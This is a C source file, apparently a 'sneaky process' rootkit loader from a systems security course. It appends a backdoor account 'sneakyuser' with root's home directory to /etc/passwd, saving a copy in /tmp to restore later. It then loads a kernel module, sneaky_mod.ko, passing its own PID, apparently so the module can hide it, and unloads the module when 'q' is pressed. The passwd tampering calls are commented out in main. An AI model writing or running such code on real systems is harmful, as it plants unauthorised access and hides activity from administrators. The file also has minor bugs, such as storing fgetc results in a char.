#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>   

int cp_passwd(){
  FILE *fin;
  FILE *fout;
  char c;
  fin = fopen("/etc/passwd", "r+");
  if(fin == NULL){
    printf("Cannot open /etc/passwd\n");
    return EXIT_FAILURE;
  }
  fout = fopen("/tmp/passwd","w");
  if(fout == NULL){
    printf("Cannot open /tmp/passwd\n");
    return EXIT_FAILURE;
  }
  c = fgetc(fin);
  while (c != EOF){
    fputc(c, fout);
    c = fgetc(fin);
  }
  int put = fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",fin);
  if(put == EOF){
    printf("fput failed\n");
    return EXIT_FAILURE;
  }
  if(fclose(fin) != 0){
    printf("failed to close /etc/passwd\n");
    return EXIT_FAILURE;
  }
  if(fclose(fout) != 0){
    printf("failed to close /tmp/passwd\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

int restore_passwd(){
  FILE *fin;
  FILE *fout;
  char c;
  fin = fopen("/tmp/passwd", "r+");
  if(fin == NULL){
    printf("Cannot open /tmp/passwd\n");
    return EXIT_FAILURE;
  }
  fout = fopen("/etc/passwd","w");
  if(fout == NULL){
    printf("Cannot open /etc/passwd\n");
    return EXIT_FAILURE;
  }
  c = fgetc(fin);
  while (c != EOF){
    fputc(c, fout);
    c = fgetc(fin);
  }
  if(fclose(fin) != 0){
    printf("failed to close /tmp/passwd\n");
    return EXIT_FAILURE;
  }
  if(fclose(fout) != 0){
    printf("failed to close /etc/passwd\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

int main(){
  //cp_passwd();
  
  int sneaky_pid = getpid();
  pid_t fpid = fork();
  int status;
   
  if(fpid<0){
    printf("error in fork");
  }
  else if(fpid == 0){
    //child process
    char buffer[32] = "sneaky_pid=";
    printf("sneaky_pid = %d\n",sneaky_pid);
    char s_pid[16];
    sprintf(s_pid,"%d",sneaky_pid);
    strcat(buffer,s_pid);
    printf("buffer:%s\n", buffer);
    char* argv[] = {"insmod","sneaky_mod.ko",buffer,NULL};
    execvp("insmod",argv); 
  }
  else{
    //parent process
	printf("parent process\n");
    pid_t w = waitpid(fpid,&status,WUNTRACED|WCONTINUED);
    if (w == -1){
      printf("waitpid failed\n");
      exit(EXIT_FAILURE);
    }
    if (WIFEXITED(status)) {
      printf("exited, status=%d\n", WEXITSTATUS(status));
    }
    else if (WIFSIGNALED(status)) {
      printf("killed by signal %d\n", WTERMSIG(status));
    } 
    else if (WIFSTOPPED(status)) {
      printf("stopped by signal %d\n", WSTOPSIG(status));
    } 
    else if (WIFCONTINUED(status)) {
      printf("continued\n");
    }
    while (getchar() != 'q') {	}
    
    pid_t fpid2 = fork();
    int status2;
    if(fpid2 < 0){
      printf("error in fork");
    }
    else if(fpid2 == 0){
	  printf("Planning to rmmod sneaky mod\n");
      char* args[] = {"rmmod","sneaky_mod",NULL};
      execvp("rmmod",args);
    }
    else{
      pid_t w2 = waitpid(fpid2,&status2,WUNTRACED|WCONTINUED);
      if (w2 == -1){
        printf("waitpid failed\n");
        exit(EXIT_FAILURE);
      }
      if (WIFEXITED(status)) {
        printf("exited, status=%d\n", WEXITSTATUS(status));
      }
      else if (WIFSIGNALED(status)) {
        printf("killed by signal %d\n", WTERMSIG(status));
      } 
      else if (WIFSTOPPED(status)) {
        printf("stopped by signal %d\n", WSTOPSIG(status));
      } 
      else if (WIFCONTINUED(status)) {
        printf("continued\n");
      }
    }
  }
  //restore_passwd();
  return EXIT_SUCCESS;
}
